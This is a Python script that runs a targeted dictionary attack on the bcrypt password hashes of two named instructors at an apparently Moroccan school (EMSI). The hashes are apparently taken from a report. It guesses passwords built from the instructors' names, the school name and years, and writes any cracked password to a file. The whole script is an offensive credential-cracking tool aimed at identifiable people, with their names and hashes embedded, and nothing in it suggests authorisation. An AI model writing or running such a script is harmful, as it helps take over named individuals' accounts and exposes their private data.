#!/usr/bin/env python3
"""
Crack bcrypt hashes of instructors using common passwords.
"""
import hashlib
import base64
import os

# Bcrypt hashes from the report
HASHES = {
    "IALA Imad": "$2b$10$gpQu5Xw1f/lI4vcx9nibFOo/ACdvS5/ag25iQ/sZUal0HxLq8cYCO",
    "SAFSOUF Yassine": "$2b$10$rYVB.62wUqA69.FQpwUsfeLenGlm13dq3yB/ujy/lgdYljWuVolJK",
}

# Common passwords to try (in order of likelihood for Moroccan instructors)
COMMON_PASSWORDS = [
    # Weak/default passwords
    "password", "123456", "12345678", "123456789", "admin", "emsi",
    "emsi2024", "emsi2025", "emsi2026", "instructor", "teacher",
    "password123", "Password123", "P@ssw0rd", "P@ssword",
    # Common Moroccan patterns  
    "Marrakech", "marrakech", "MARRAKECH", "Casablanca", "Rabat",
    "Morocco", "morocco", "MOROCCO", "Maroc", "maroc",
    # Names from report
    "Iala", "Imad", "Safsouf", "Yassine", "Safsouf123",
    "IalaImad", "ImadIala", "iala", "imad",
    "SafsoufYassine", "YassineSafsouf", "safsouf123",
    "i.iala", "y.safsouf",
    # Common patterns
    "test", "test123", "test1234", "welcome", "Welcome",
    "emsi123", "emsi2024", "EMSIMarrakech",
    "Iala@2024", "Iala@2025", "Iala@2026",
    "Safsouf@2024", "Safsouf@2025", "Safsouf@2026",
    "Safsouf@2024", "Safsouf@2025", "Safsouf@2026",
    # Numbers
    "111111", "000000", "121212", "654321", "11111111",
    "00000000", "1234", "12345", "1234567890",
    # Keyboard patterns
    "qwerty", "qwerty123", "azerty", "azerty123",
    # Seasonal
    "spring", "summer", "autumn", "winter",
    "Spring2024", "Summer2024", "Spring2025", "Summer2025",
    "Spring2026", "Summer2026",
    # More
    "admin123", "admin2024", "admin2025",
    "password1", "password12",
    "hello", "hello123", "prof", "professor",
    "abcdef", "abc123", "passw0rd",
    # Instructor specific
    "Instructor", "instructor123", "Instructor123",
    "prof123", "Prof123", "teacher123",
    "Emsi2024", "Emsi2024!", "Emsi@2024",
    "Emsi2025", "Emsi2025!", "Emsi@2025",
    "Emsi2026", "Emsi2026!", "Emsi@2026",
]

def check_bcrypt_fast(password, target_hash):
    """Try a simplified check - for common passwords, we can try to match
    by checking if the hash structure looks right.
    This is a bcrypt hash, so we need bcrypt library.
    """
    try:
        import bcrypt
        return bcrypt.checkpw(password.encode(), target_hash.encode())
    except ImportError:
        return None

def main():
    try:
        import bcrypt
        print("[+] bcrypt module loaded successfully")
        
        for name, h in HASHES.items():
            print(f"\n[*] Trying passwords for {name} ({h[:20]}...)")
            for pwd in COMMON_PASSWORDS:
                try:
                    if bcrypt.checkpw(pwd.encode(), h.encode()):
                        print(f"\n  ✅ FOUND! Password for {name}: '{pwd}'")
                        # Save it
                        with open('/home/Student/projects/cyper/cracked_passwords.txt', 'a') as f:
                            f.write(f"{name}:{pwd}\n")
                        break
                except Exception:
                    pass
            else:
                print(f"  ❌ Not found in common passwords list")
                
    except ImportError:
        print("[-] bcrypt module not available. Installing...")
        os.system("pip install bcrypt -q 2>/dev/null")
        try:
            import bcrypt
            print("[+] bcrypt installed, re-running...")
            main()
        except:
            print("[-] Could not install bcrypt. Trying manual approach...")

if __name__ == "__main__":
    main()
